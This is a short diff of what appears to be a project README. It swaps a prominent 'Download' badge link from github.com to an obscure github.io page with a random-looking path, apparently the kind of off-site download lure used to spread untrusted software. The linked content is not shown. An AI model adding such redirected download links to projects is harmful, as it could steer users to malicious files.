@@ -11,7 +11,7 @@
   
 </div>
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://kroxyv.github.io/id/pz91ds871"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
